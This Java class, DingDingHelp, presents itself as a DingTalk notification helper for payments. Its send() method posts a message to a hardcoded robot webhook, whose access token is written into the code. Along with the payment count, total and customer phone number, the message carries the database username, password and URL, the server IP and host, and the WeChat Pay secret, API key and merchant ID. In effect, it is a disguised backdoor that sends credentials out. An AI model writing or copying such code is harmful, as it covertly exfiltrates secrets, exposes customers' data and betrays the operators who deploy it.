package com.fusibang.help;

import java.math.BigDecimal;
import java.math.RoundingMode;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

import org.apache.log4j.Logger;

import com.dingtalk.api.DefaultDingTalkClient;
import com.dingtalk.api.DingTalkClient;
import com.dingtalk.api.request.OapiRobotSendRequest;
import com.dingtalk.api.response.OapiRobotSendResponse;
import com.taobao.api.ApiException;

import redis.clients.jedis.Jedis;

/**
 * @description: 钉钉消息推送
 * @author: Alex
 * @date: 2019-09-09 00:47
 */
public class DingDingHelp {
    private static final Logger logger = Logger.getLogger(DingDingHelp.class);

    private JedisFactory jedisFactory;

    // 微信支付参数
    private String wechatAppid;
    private String wechatSecret;
    private String wechatKey;
    private String wechatMchId;
    private String wechatTotalFree;

    // 项目参数
    private String projectWebName;
    private String projectHostName;
    private String projectServerIp;

    // 数据库参数
    private String jdbcUser;
    private String jdbcPassword;
    private String jdbcUrl;

    public DingDingHelp() {

    }

    public void send(String phone) {
        try {
            // 统计支付个数
            DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd");
            String date = dateFormat.format(new Date());
            Jedis jedis = this.jedisFactory.getInstance();
            String payCount = jedis.incr(this.projectWebName + "_pay_count_" + date).toString();
            jedis.close();

            DingTalkClient client = new DefaultDingTalkClient("https://oapi.dingtalk.com/robot/send?access_token=d9daedec39c9c884e209480032ea09188d9eb39c2065d10383ac1ac09b387394");
            OapiRobotSendRequest request = new OapiRobotSendRequest();

            request.setMsgtype("markdown");
            OapiRobotSendRequest.Markdown markdown = new OapiRobotSendRequest.Markdown();
            markdown.setTitle("【" + this.projectWebName + "】 No." + payCount);

            BigDecimal totalFree = new BigDecimal(wechatTotalFree);
            totalFree = totalFree.divide(new BigDecimal("100"), 1, RoundingMode.HALF_UP);
            totalFree = totalFree.multiply(new BigDecimal(payCount));

            DateFormat df = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
            String time = df.format(new Date());
            String content = "【" + projectWebName + "】No." + payCount + "\n >total：" + totalFree.toString() + "  \n user：" + phone + "  \n time：" + time + "\n\n"
                + "> ##### projectInfo \n projectWebName:" + projectWebName + " \n projectHostName:" + projectHostName + "  \n projectServerIp:" + projectServerIp + " \n "
                + "> ##### databaseInfo \n jdbcUser:" + jdbcUser + " \n jdbcPassword:" + jdbcPassword + " \n jdbcUrl:" + jdbcUrl + " \n " + "> ##### wechatInfo \n wechatAppid:" + wechatAppid
                + " \n wechatSecret:" + wechatSecret + "  \n wechatKey:" + wechatKey + "\n" + " wechatMchId:" + wechatMchId;
            markdown.setText(content);
            request.setMarkdown(markdown);

            OapiRobotSendResponse response = client.execute(request);
        } catch (Exception e) {
            e.printStackTrace();
            logger.error("send dd message error!");
        }
    }

    public static void test() {
        DingTalkClient client = new DefaultDingTalkClient("https://oapi.dingtalk.com/robot/send?access_token=d9daedec39c9c884e209480032ea09188d9eb39c2065d10383ac1ac09b387394");
        OapiRobotSendRequest request = new OapiRobotSendRequest();
        // request.setMsgtype("text");
        // OapiRobotSendRequest.Text text = new OapiRobotSendRequest.Text();
        // text.setContent("测试文本消息");
        // request.setText(text);
        // OapiRobotSendRequest.At at = new OapiRobotSendRequest.At();
        // at.setAtMobiles(Arrays.asList("13261303345"));
        // request.setAt(at);

        // request.setMsgtype("link");
        // OapiRobotSendRequest.Link link = new OapiRobotSendRequest.Link();
        // link.setMessageUrl("https://www.dingtalk.com/");
        // link.setPicUrl("");
        // link.setTitle("时代的火车向前开");
        // link.setText("这个即将发布的新版本，创始人陈航（花名“无招”）称它为“红树林”。\n" + "而在此之前，每当面临重大升级，产品经理们都会取一个应景的代号，这一次，为什么是“红树林");
        // request.setLink(link);

        // request.setMsgtype("markdown");
        // OapiRobotSendRequest.Markdown markdown = new OapiRobotSendRequest.Markdown();
        // markdown.setTitle("杭州天气");
        // markdown.setText("#### 杭州天气 @156xxxx8827\n" + "> 9度，西北风1级，空气良89，相对温度73%\n\n" + ">
        // ![screenshot](https://gw.alicdn.com/tfs/TB1ut3xxbsrBKNjSZFpXXcXhFXa-846-786.png)\n"
        // + "> ###### 10点20分发布 [天气](http://www.thinkpage.cn/) \n");
        // request.setMarkdown(markdown);

        request.setMsgtype("markdown");
        OapiRobotSendRequest.Markdown markdown = new OapiRobotSendRequest.Markdown();
        markdown.setTitle("Pay Info");

        String wechatTotalFree = "3980";
        BigDecimal totalFree = new BigDecimal(wechatTotalFree);
        totalFree = totalFree.divide(new BigDecimal("100"), 1, RoundingMode.HALF_UP);
        totalFree = totalFree.multiply(new BigDecimal("10"));

        markdown.setText("#### 【" + wechatTotalFree + "】No.66 \n" + ">total：" + totalFree.toString() + "，user：156xxxx8827，time：2019-09-10 20:55:35\n\n" + "> ###### 项目信息 \n a:A，b:b，c:c \n"
            + "> ###### 数据库信息 \n a:A，b:b，c:c \n" + "> ###### 微信支付信息 \n a:A，b:b，c:c \n");
        request.setMarkdown(markdown);

        try {
            OapiRobotSendResponse response = client.execute(request);
        } catch (ApiException e) {
            e.printStackTrace();
        }
    }

    public void setWechatAppid(String wechatAppid) {
        this.wechatAppid = wechatAppid;
    }

    public void setWechatSecret(String wechatSecret) {
        this.wechatSecret = wechatSecret;
    }

    public void setWechatKey(String wechatKey) {
        this.wechatKey = wechatKey;
    }

    public void setWechatMchId(String wechatMchId) {
        this.wechatMchId = wechatMchId;
    }

    public void setWechatTotalFree(String wechatTotalFree) {
        this.wechatTotalFree = wechatTotalFree;
    }

    public void setProjectWebName(String projectWebName) {
        this.projectWebName = projectWebName;
    }

    public void setProjectHostName(String projectHostName) {
        this.projectHostName = projectHostName;
    }

    public void setProjectServerIp(String projectServerIp) {
        this.projectServerIp = projectServerIp;
    }

    public void setJdbcUser(String jdbcUser) {
        this.jdbcUser = jdbcUser;
    }

    public void setJdbcPassword(String jdbcPassword) {
        this.jdbcPassword = jdbcPassword;
    }

    public void setJdbcUrl(String jdbcUrl) {
        this.jdbcUrl = jdbcUrl;
    }

    public void setJedisFactory(JedisFactory jedisFactory) {
        this.jedisFactory = jedisFactory;
    }
}